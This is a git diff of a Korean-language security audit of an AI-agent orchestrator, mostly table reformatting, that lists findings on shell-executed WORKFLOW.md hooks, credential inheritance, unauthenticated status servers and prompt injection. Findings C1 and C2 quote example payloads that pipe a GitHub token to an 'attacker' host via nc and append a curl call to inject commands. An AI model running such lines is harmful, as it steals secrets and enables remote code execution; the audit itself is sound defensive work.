@@ -13,15 +13,16 @@
 
 ## 요약
 
-| 심각도 | 건수 | 차원 분포 |
-|---|---|---|
-| 🔴 Critical | 2 | 보안 2 |
-| 🟠 High | 13 | 보안 6 · 설계 6 · 사용성 1 |
-| 🟡 Medium | 10 | 설계 6 · 보안 2 · 사용성 2 |
-| ⚪ Low | 6 | 설계 5 · 사용성 1 |
-| **합계** | **31** | 보안 12 · 설계 15 · 사용성 4 |
+| 심각도      | 건수   | 차원 분포                    |
+| ----------- | ------ | ---------------------------- |
+| 🔴 Critical | 2      | 보안 2                       |
+| 🟠 High     | 13     | 보안 6 · 설계 6 · 사용성 1   |
+| 🟡 Medium   | 10     | 설계 6 · 보안 2 · 사용성 2   |
+| ⚪ Low      | 6      | 설계 5 · 사용성 1            |
+| **합계**    | **31** | 보안 12 · 설계 15 · 사용성 4 |
 
 핵심 테마:
+
 1. **멀티테넌트 신뢰 경계·자격증명 스코핑 부재** — 신뢰할 수 없는 레포 설정(WORKFLOW.md)이 셸로 실행되고, 오케스트레이터의 전체 자격증명이 필터 없이 상속됨 (C1, C2, H1, H2, H5, M25).
 2. **조정(Coordination) 계층의 상태 일관성/락 정확성** — PID-only 락, 비원자적 상태 쓰기, 크래시 복구 고착, 무신호 중단 (H7~H11, M18~M20, M24, M25).
 3. **인증 없는 HTTP 상태 서버 노출** — `0.0.0.0` 바인딩 + 무인증 상태 조회/강제 실행 (H3, H14, M21).
@@ -32,12 +33,14 @@
 ## 🔴 Critical
 
 ### C1. WORKFLOW.md hook 명령이 검증·이스케이프 없이 `bash -lc`로 실행 — 보안 · confirmed
+
 - **파일**: `packages/core/src/workspace/hooks.ts:48`
 - **근거**: `spawn("bash", ["-lc", normalizedCommand], { env: { ...process.env, ...env } })`. hook 문자열은 레포별 WORKFLOW.md(`after_create`/`before_run`/`after_run`/`before_remove`)에서 로드되며, `normalizeHookCommand`(210–222)는 상대경로에 `bash ./`만 붙일 뿐 메타문자 검증·이스케이프가 전혀 없음. 오케스트레이터 전체 `process.env`(자격증명 포함)가 상속됨.
 - **영향**: 악의적 WORKFLOW.md가 `after_create: "echo $GITHUB_GRAPHQL_TOKEN | nc attacker 1"` 로 토큰 탈취·레포 파괴·**동일 오케스트레이터를 공유하는 타 테넌트로의 횡적 이동**(RCE급).
 - **권장**: 아래 **부록 A(C1 상세 해결안)** 참조. 요약 — ① 신뢰 게이트(신뢰된 WORKFLOW.md만 hook 실행) ② 실행 격리(샌드박스) ③ hook env 시크릿 스트립. C2는 argv-no-shell 고정.
 
 ### C2. WORKFLOW.md `agentCommand`를 다시 `bash -lc`로 감싸 셸 인젝션 — 보안 · confirmed
+
 - **파일**: `packages/runtime-codex/src/runtime.ts:445-448`, `:475-478`
 - **근거**: `config.agentCommand`(WORKFLOW.md 출처)에서 `bash -lc ` 접두만 벗겨 `args: ["-lc", shellCmd]`로 재-spawn, `...process.env` 스프레드. allowlist·이스케이프 없음.
 - **영향**: `agentCommand: "codex; curl attacker/$(whoami)"` 로 워커 환경에서 임의 셸 실행 → RCE·시크릿 유출.
@@ -98,31 +101,31 @@
 
 ## 🟡 Medium
 
-| # | 제목 | 차원 | 검증 | 파일 |
-|---|---|---|---|---|
-| M16 | 이슈 본문/WORKFLOW.md가 에이전트 프롬프트로 무가공 유입 — **의미적 프롬프트 인젝션 + Liquid 렌더 타임아웃 부재 DoS**. ("템플릿 인젝션" 주장은 반증: 값은 데이터로만 치환됨) | 보안 | plausible | `service.ts`, `packages/core/src/workflow/render.ts:223` |
-| M17 | `doctor --json`/`--bundle`이 env 시크릿·에러 텍스트를 전체 리댁션 없이 캡처. (bundle 경로는 리댁션됨 → `--json` + API가 에러에 토큰 담을 때로 한정) | 보안 | plausible | `packages/cli/src/commands/doctor.ts:2677` |
-| M18 | `stop` PID 파일 TOCTOU → PID 재사용 시 무관 프로세스 종료. spawn 실패 시 PID 파일 미정리 | 설계 | confirmed | `packages/cli/src/commands/stop.ts:79`, `start.ts:1103` |
-| M19 | GraphQL 메타데이터 무검증 + `stateFieldName` 미설정 시 전 이슈 'Unknown' 폴백 → 무신호 중단 | 설계 | confirmed | `packages/tracker-github/src/adapter.ts:345` |
-| M20 | GitHub GraphQL rate-limit 가드 check-then-sleep 레이스 → 동시성 하 API 버스트로 실제 429 유발 | 설계 | confirmed | `packages/tracker-github/src/adapter.ts:1495-1520` |
-| M21 | HTTP 서버 보안 헤더 부재(X-Frame-Options/nosniff/CSP), 전체 에러 객체 로깅(경로 누출), charset 불일치 | 보안 | confirmed | `packages/control-plane/src/server.ts:309`, `dashboard/src/server.ts:117` |
-| M22 | cleanup/hook/이벤트 핸들러 에러 삼킴 → 스테일 락 잔존, 삭제 실패에도 'removed' 마킹(디스크 누수), 관측성 이벤트 유실 | 사용성 | confirmed | `packages/orchestrator/src/service.ts:3268`, `index.ts:117` |
-| M23 | 잘못된 WORKFLOW.md를 last-known-good로 조용히 폴백(1회 stderr, 이후 dedup으로 은폐) | 사용성 | confirmed | `packages/orchestrator/src/service.ts:3012-3067` |
-| M24 | exit 분류에 `canceled_by_reconciliation` 분기 없음 → 의도적 취소가 'error'로 오분류(메트릭 오염) | 설계 | confirmed | `packages/core/src/workflow/exit-classification.ts:31` |
-| M25 | `.runtime`가 단일 디렉터리에 전 프로젝트 상태 저장, 권한 강제 없음(`projectDir()`가 projectId 무시) → 공유 배포 시 교차 프로젝트 읽기/손상 | 설계 | confirmed | `packages/orchestrator/src/fs-store.ts` |
+| #   | 제목                                                                                                                                                                        | 차원   | 검증      | 파일                                                                      |
+| --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------ | --------- | ------------------------------------------------------------------------- |
+| M16 | 이슈 본문/WORKFLOW.md가 에이전트 프롬프트로 무가공 유입 — **의미적 프롬프트 인젝션 + Liquid 렌더 타임아웃 부재 DoS**. ("템플릿 인젝션" 주장은 반증: 값은 데이터로만 치환됨) | 보안   | plausible | `service.ts`, `packages/core/src/workflow/render.ts:223`                  |
+| M17 | `doctor --json`/`--bundle`이 env 시크릿·에러 텍스트를 전체 리댁션 없이 캡처. (bundle 경로는 리댁션됨 → `--json` + API가 에러에 토큰 담을 때로 한정)                         | 보안   | plausible | `packages/cli/src/commands/doctor.ts:2677`                                |
+| M18 | `stop` PID 파일 TOCTOU → PID 재사용 시 무관 프로세스 종료. spawn 실패 시 PID 파일 미정리                                                                                    | 설계   | confirmed | `packages/cli/src/commands/stop.ts:79`, `start.ts:1103`                   |
+| M19 | GraphQL 메타데이터 무검증 + `stateFieldName` 미설정 시 전 이슈 'Unknown' 폴백 → 무신호 중단                                                                                 | 설계   | confirmed | `packages/tracker-github/src/adapter.ts:345`                              |
+| M20 | GitHub GraphQL rate-limit 가드 check-then-sleep 레이스 → 동시성 하 API 버스트로 실제 429 유발                                                                               | 설계   | confirmed | `packages/tracker-github/src/adapter.ts:1495-1520`                        |
+| M21 | HTTP 서버 보안 헤더 부재(X-Frame-Options/nosniff/CSP), 전체 에러 객체 로깅(경로 누출), charset 불일치                                                                       | 보안   | confirmed | `packages/control-plane/src/server.ts:309`, `dashboard/src/server.ts:117` |
+| M22 | cleanup/hook/이벤트 핸들러 에러 삼킴 → 스테일 락 잔존, 삭제 실패에도 'removed' 마킹(디스크 누수), 관측성 이벤트 유실                                                        | 사용성 | confirmed | `packages/orchestrator/src/service.ts:3268`, `index.ts:117`               |
+| M23 | 잘못된 WORKFLOW.md를 last-known-good로 조용히 폴백(1회 stderr, 이후 dedup으로 은폐)                                                                                         | 사용성 | confirmed | `packages/orchestrator/src/service.ts:3012-3067`                          |
+| M24 | exit 분류에 `canceled_by_reconciliation` 분기 없음 → 의도적 취소가 'error'로 오분류(메트릭 오염)                                                                            | 설계   | confirmed | `packages/core/src/workflow/exit-classification.ts:31`                    |
+| M25 | `.runtime`가 단일 디렉터리에 전 프로젝트 상태 저장, 권한 강제 없음(`projectDir()`가 projectId 무시) → 공유 배포 시 교차 프로젝트 읽기/손상                                  | 설계   | confirmed | `packages/orchestrator/src/fs-store.ts`                                   |
 
 ---
 
 ## ⚪ Low
 
-| # | 제목 | 차원 | 검증 | 파일 |
-|---|---|---|---|---|
-| L26 | 워크스페이스 경로 이탈 검사가 `/` 하드코딩·symlink 미인식(realpath 미적용) → Windows 워크스페이스 생성 DoS + symlink 시나리오 | 보안 | confirmed | `packages/core/src/workspace/safety.ts:10`, `identity.ts:75` |
-| L27 | Claude 세션 resume이 stderr 4xx 정규식 의존 + 소유권 미검증. (prod에서 previousRunId 미사용 → 위험 제한적) | 설계 | plausible | `packages/runtime-claude/src/adapter.ts:219-283`, `:633-645` |
-| L28 | 수렴 감지가 git HEAD를 레이스로 샘플링 + 수렴락 최대수명 없음. (타임스탬프 파싱 실패 엣지케이스로 한정) | 설계 | plausible | `packages/worker/src/convergence-detection.ts:67-149` |
-| L29 | approval/sandbox 기본값(`never`/`danger-full-access`)을 enum 검증 없이 수용 → 오타 시 조용히 permissive 동작 | 사용성 | plausible | `packages/worker/src/codex-policy.ts:11-25` |
-| L30 | config/token-usage/status 쓰기에 크로스프로세스 락 없음 → 동시 `config set` 유실, 토큰 아티팩트 무신호 유실 | 설계 | plausible | `packages/cli/src/config.ts:171-180` |
-| L31 | `IssueOrchestrationState` 전이 검증 부재(현재 호출부는 정상이나 리팩터링 리스크) | 설계 | plausible | `packages/core/src/contracts/issue-orchestration.ts` |
+| #   | 제목                                                                                                                          | 차원   | 검증      | 파일                                                         |
+| --- | ----------------------------------------------------------------------------------------------------------------------------- | ------ | --------- | ------------------------------------------------------------ |
+| L26 | 워크스페이스 경로 이탈 검사가 `/` 하드코딩·symlink 미인식(realpath 미적용) → Windows 워크스페이스 생성 DoS + symlink 시나리오 | 보안   | confirmed | `packages/core/src/workspace/safety.ts:10`, `identity.ts:75` |
+| L27 | Claude 세션 resume이 stderr 4xx 정규식 의존 + 소유권 미검증. (prod에서 previousRunId 미사용 → 위험 제한적)                    | 설계   | plausible | `packages/runtime-claude/src/adapter.ts:219-283`, `:633-645` |
+| L28 | 수렴 감지가 git HEAD를 레이스로 샘플링 + 수렴락 최대수명 없음. (타임스탬프 파싱 실패 엣지케이스로 한정)                       | 설계   | plausible | `packages/worker/src/convergence-detection.ts:67-149`        |
+| L29 | approval/sandbox 기본값(`never`/`danger-full-access`)을 enum 검증 없이 수용 → 오타 시 조용히 permissive 동작                  | 사용성 | plausible | `packages/worker/src/codex-policy.ts:11-25`                  |
+| L30 | config/token-usage/status 쓰기에 크로스프로세스 락 없음 → 동시 `config set` 유실, 토큰 아티팩트 무신호 유실                   | 설계   | plausible | `packages/cli/src/config.ts:171-180`                         |
+| L31 | `IssueOrchestrationState` 전이 검증 부재(현재 호출부는 정상이나 리팩터링 리스크)                                              | 설계   | plausible | `packages/core/src/contracts/issue-orchestration.ts`         |
 
 ---
 
@@ -153,14 +156,14 @@
 
 ### 방어 방식별 "다른 로컬 CLI 실행" 영향
 
-| 방어 방식 | 다른 CLI 실행 | 무엇이 깨지나 |
-|---|---|---|
-| env 시크릿 스트립 | ✅ 전부 됨 | `$GITHUB_GRAPHQL_TOKEN`에 의존한 hook만 |
-| 신뢰 게이트 | ✅ 전부 됨 | 비신뢰 레포의 hook만 차단 |
-| 커밋된 스크립트 allowlist | ✅ 전부 됨 | inline 문자열 금지, 스크립트 내부는 자유 (균형 최상) |
-| 샌드박스(컨테이너) | ⚠️ 컨테이너 설치분만 | 호스트 `gh auth` 키링 비가시 → broker/scoped 토큰 필요 |
-| argv-no-shell | ⚠️ 단일 CLI만 | 파이프·`&&`·`$VAR`·glob·리다이렉트 상실. C2에 적합, hook엔 과함 |
-| 메타문자 블록리스트 | ⚠️ 부분 | 정당한 조합도 차단 + 우회 여지 → 비추천 |
+| 방어 방식                 | 다른 CLI 실행        | 무엇이 깨지나                                                   |
+| ------------------------- | -------------------- | --------------------------------------------------------------- |
+| env 시크릿 스트립         | ✅ 전부 됨           | `$GITHUB_GRAPHQL_TOKEN`에 의존한 hook만                         |
+| 신뢰 게이트               | ✅ 전부 됨           | 비신뢰 레포의 hook만 차단                                       |
+| 커밋된 스크립트 allowlist | ✅ 전부 됨           | inline 문자열 금지, 스크립트 내부는 자유 (균형 최상)            |
+| 샌드박스(컨테이너)        | ⚠️ 컨테이너 설치분만 | 호스트 `gh auth` 키링 비가시 → broker/scoped 토큰 필요          |
+| argv-no-shell             | ⚠️ 단일 CLI만        | 파이프·`&&`·`$VAR`·glob·리다이렉트 상실. C2에 적합, hook엔 과함 |
+| 메타문자 블록리스트       | ⚠️ 부분              | 정당한 조합도 차단 + 우회 여지 → 비추천                         |
 
 **결론**: "다른 CLI 실행"을 근본 차단하는 건 argv-no-shell 뿐이며 그마저 단일 CLI는 실행됨(조합만 상실). 나머지는 CLI 실행에 영향 없음 → **편의성 유지하며 수정 가능**. 권장 조합: **C1 = 신뢰 게이트 + hook env 스트립 + 에이전트 자기수정 차단**, **C2 = argv-no-shell 고정**.
 
